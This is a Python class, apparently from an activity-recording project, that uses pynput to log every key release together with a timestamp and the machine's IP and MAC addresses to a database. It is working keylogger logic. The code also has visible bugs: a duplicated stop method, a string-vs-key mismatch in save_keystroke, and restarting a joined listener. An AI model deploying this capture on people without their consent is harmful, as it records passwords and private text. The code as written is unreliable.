from services.Recorder import Recorder
from db.KeystrokeDAO import KeystrokeDAO
import pynput
from models.Keystroke import Keystroke
from models.Annotation import Annotation


class KeystrokeRecorder(Recorder):
    def __init__(self) -> None:
        super().__init__()
        self.ip = super().get_ip()
        self.mac = super().get_mac()
        self.ksDAO = KeystrokeDAO()
        self.listener = pynput.keyboard.Listener(on_release=self.on_release)
        self.listener.start()
        self.listener.join()

    def on_release(self, key):
        try:
            self.save_keystroke(str(key.char))
        except AttributeError:
            self.save_keystroke(str(key)[4:])

    def stop(self):
        try:
            self.listener.stop()
        except Exception as e:
            raise e

    def save_keystroke(self, key):
        self.ksDAO.create(Keystroke(timestamp=super().get_timestamp(), ip_address=self.ip,
                                    mac_address=self.mac, annotations=Annotation(self.ip, None), key=str(key.char)))

    def stop(self):
        self.listener.stop()

    def start(self):
        self.listener.start()



